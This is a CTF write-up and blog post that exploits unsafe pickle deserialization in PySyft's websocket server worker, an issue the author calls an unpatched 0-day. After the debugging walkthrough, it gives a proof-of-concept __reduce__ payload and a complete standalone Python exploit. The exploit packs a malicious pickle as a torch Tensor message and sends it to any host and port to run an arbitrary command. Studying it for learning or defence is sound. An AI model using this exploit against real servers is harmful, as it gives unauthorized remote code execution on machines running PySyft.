[![Twitter Follow](https://img.shields.io/twitter/follow/nahueldsanchez_?color=1DA1F2&logo=twitter&style=for-the-badge)](https://twitter.com/nahueldsanchez_?s=20) 

TL; DR
======
* This blogpost explains how to exploit a bug in `PySyft` —a Python project for **deep Learning**
* I DID NOT find this bug. It was publicy reported to the maintainers on GitHub
* The bug doesn't have a patch yet (0-day)
* A fully working exploit is provided
* The exploit abuses the unpickling of arbitrary objects.

Introduction
============

Some time ago I tried to solve some of the challenges that were part of [Pwn2Win CTF](https://ctftime.org/event/822/tasks/) during the event. I really sucked at it but I kept some of the challenges to solve them later.

This blogpost will be focused on solving a challenge called __Federated Sophia__. I didn't find any *complete* writeup for it.

What I found looking for a writeup was the following open issue in a `Python` project used for the challenge: [Tensor pickle: arbitrary remote code execution issue #2727](https://github.com/OpenMined/PySyft/issues/2727).

The bug
-------

If we go and check the [issue](#Introduction), it looks like that some code arbitrarily unpickles untrusted objects. I'm not really good at Python but I do know that unpickling untrusted objects could lead to bad things. Having this information, I've decided to find the bug and write and exploit for it.

The challenge: Federated Sophia
===============================
During the event, we were given the following files:

```
data.py
federated_sophia.py
requirements.txt
```

After checking the _requirements.txt_ file we know that the code needs:

* torch
* syft

I googled what that meant and found the `PySyft` GitHub page. I needed an environment to confirm the bug and to test my exploit (assuming that I was going to be able to write it...)

Setting up the environment
--------------------------

1) Download `Pysyft` from git

```
git clone https://github.com/OpenMined/PySyft
```

2) Create a `virtual environment` (Python3) and install dependencies from the folder `PySyft/pip-dep/requirements.txt`

```
virtualenv pysyft --python=python3
source pysyft/bin/activate
cd Pysyft/pip-dep
pip install -r requirements-txt
```


3) Install `Pysyft` in the virtual environment

```
cd Pysyft
python setup.py install
```

Reproducing and debugging the bug
---------------------------------

With the enviroment set up I reviewed the code from _federated_sophia.py_ and also rechecked the [GitHub issue mentioned above](#Introduction). It mentioned something  about __WebsocketServerWorker__. I assumed that the CTF organizers set up a `WebSocket server` that the WebSocket client inside _federated_sophia.py_ connected back.

I reproduced this scenario using the Python script provided by Pysyft in: *Pysyft/run_websocket_server.py* like this:

```
python run_websocket_server.py --port 7171
```

After I ran the script provided by the organizers and checked that everything was working, my next step was to debug this code.

I had LOTS of pain during this step as I hit some bugs in Visual Studio Code and Pycharm regarding debugging code with uses multiprocessing with Python3. Long story short, I was able to overcome that by attaching `PyCharm` to the code already running.

I reviewed the code very quickly and set up a breakpoint at function _\_producer_handler_ in `websocket_server.py`. Specifically on **line 110** which receives the raw message sent by the client.

```Python
...
106 # get a message from the queue
107 message = await self.broadcast_queue.get()
108 
109 # convert that string message to the binary it represent
110 message = binascii.unhexlify(message[2:-1])
111
112 # process the message
113 response = self._recv_msg(message)
...
```

From there I continued tracing my input as follows:

* _recv_msg
* recv_msg
* deserialize (serde.py#69)
* deserialize (serde.py#371) -> Here *_deserialize_msgpack_binary* is called that ends up calling *compression._decompress*
* _deserialize_msgpack_simple
* _detail


Once I was playing with the code I thought: _"Why I can't I just simply send a malicious pickle serialized object and that's it?_

_Answer: all objects sent in `Pysyft` have some "pre processing" done before being sent. (If you are reviewing the code you already know that). This processing goes, more or less, like this: (This is based on the comments in `_serde/msgpack/serde.py_`):_

1) **Simplification**: Some objects can be difficult to serialize. This step prevents problems with that.
2) **Serialization**: Once the objects are simplificated, they can be serialized.
3) **Compression**: With the objects already serialized the resulting stream is compressed.

Function *`_detail`* will determine the object's type and call the appropiate deserializer. In other words, _detail reverses the work done by "\_simplify_".

:zap: **For our purposes this step is critical. As we need the invocation of the vulnerable deserializer. Based on the information provided in the report we know that the bug is related to Tensor objects.**

Continuing with the example, remember that I've executed the code provided by the organizers and I'm debuggig the server receiving it. If we analyze it, we can quickly understand that a `Tensor object` is being sent.

On the server side —after all the previous steps— we arrive at function _"\_detail_torch_tensor"_ (torch_serde.py#161) that calls _"\_deserialize_tensor_". This function will determine which de-serialization strategy has to be used to properly deserialize the object. That decision is made based on data passed by the client (or as we'll see, the attacker).

Next step is calling _"\_torch_tensor_deserializer_" (the deserializator chosen by the previous function) which will call `_torch.load_` (stay with me, we are a few steps from the end). `_load_` method calls _"\_legacy_load(_". **FINALLY** at `line 708` inside function _"\_legacy_load"_ we can spot the problem: **pickle_module.load(<attacker_controlled_input>)**.

Writing the exploit
-------------------

After identifying the bug I decided to write an exploit for it. My first step was to reproduce the steps explained in the vulnerability report.

### First Proof of Concept

I had some issues with this approach at the beggining (for me the explanation wasn't obvious) but at the end I got it working following these steps:

1) Add the following to file _<your_virtualenv_path>/lib/python3.7/site-packages/torch/serialization.py_ at the beggining of _save_ function (for me was line 331). (Code was copied from the bug report)

```Python
rs = ReverseShell()
pickle_module.dump(rs, f, protocol=pickle_protocol)
```

2) Add the following code in the same file (I did it around line 209):

```Python
class ReverseShell(object):
    def __reduce__(self):
        import os
        import subprocess
        if os.name == 'posix':
            return (subprocess.Popen, ('touch /tmp/bug_poc', 0, None, None, None, None, None, None, True))
        elif os.name == 'nt':
            return None
```

The idea behind these changes is clever. The author saved a lot of work. Chaning the function that serializes the `Torch object` to serialize a malicious object gave him the ability to exploit the bug without worrying about all the previous things that I've explained. To make it work, he just had to execute the code provided by the CTF that creates a Torch tensor that, in the end, when serialized FIRST will contain the malicious object.

This approach works, but I wanted to accomplish two more goals:

1) Understand the bug better
2) Write an exploit without dependencies from `Pysyft` or `Torch`

So, I decided to write my own exploit.

### Full standalone exploit

To accomplish this I started with a real Torch.Tensor object and followed how it was serialized and processed until transmitted.

I found that the object can be representend like this:

```Python
torch_tensor_simplified = (14, (4474411590, <Torch_Tensor_Object_Pickled>, None, None, None, None, (5, (b'torch',)))) 
```

After analyzing the code I learned that:

* 14 tells the code that the following object should be interpreted as a Torch.Tensor. This can be confirmed in <syft/serde/msgpack/serde.py> function _"\_detail"_. If you check the documentation it will point you to the following [file](https://github.com/OpenMined/syft-proto/blob/master/proto.json).


```json
{
  "_DOC": "This file defines PySyft protocol serialization constants",
  "VERSION": 0,
  "TYPES": {
    ...
    },
    "torch.Tensor": {
      "code": 14
    },
    ...
```

* The next constant is an ID, I left it without changes

* String __torch__ tells the code what deserializer should be used. This is key for us, as the Torch deserializer is the vulnerable one using the unsafe `pickle.load` function

Based on these points and taking the `Torch.Tensor` object we can craft our exploit as follows:

```Python
import argparse
import asyncio
import binascii
import lz4.frame
import msgpack
import pickle
import websockets


class MaliciousObject(object):
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        import os
        import subprocess
        if os.name == 'posix':
            return subprocess.Popen, (self.command, 0, None, None, None, None, None, None, True)
        elif os.name == 'nt':
            return None


def build_exploit(command):
    """
    Based on method _legacy_save from
    torch/serialization.py
    """
    # From syft/serde/compression.py
    LZ4 = 41

    rce_object = MaliciousObject(command)
    command_to_execute = pickle.dumps(rce_object, protocol=2)
    # Constants are required by pytorch to properly iterpret/deserialize the stream.
    # The first value: 14 means that the following object (the tuple) should be interpreted as
    # a Torch Tensor. I've realized this reviewing function "_detail" in:
    # syft/serde/msgpack/serde.py
    # In that function there is a dictionary "detailers".
    # We need this to reach the vulnerable code path where our malicious object
    # is passed to pickle
    payload = (14, (4474411590, command_to_execute, None, None, None, None, (5, (b'torch',))))
    packed_payload = msgpack.packb(payload)

    # Based on _compress method from syft/serde/compression.py
    compressed_payload = LZ4.to_bytes(1, byteorder="big") + lz4.frame.compress(packed_payload)
    return compressed_payload


async def send_payload(host, port):
    uri = "ws://%s:%d" % (host, port)
    async with websockets.connect(uri) as websocket:
        await websocket.send(str(binascii.hexlify(exp)))


parser = argparse.ArgumentParser()
parser.add_argument("host", help="Target host running PySyft websocket server worker", type=str)
parser.add_argument("port", help="Target websocket server port", type=int)
parser.add_argument("--command", help="Command to execute in the target websocket server",
                    type=str, default="touch /tmp/federated_sophia")

args = parser.parse_args()

exp = build_exploit(args.command)
asyncio.get_event_loop().run_until_complete(send_payload(args.host, args.port))
```


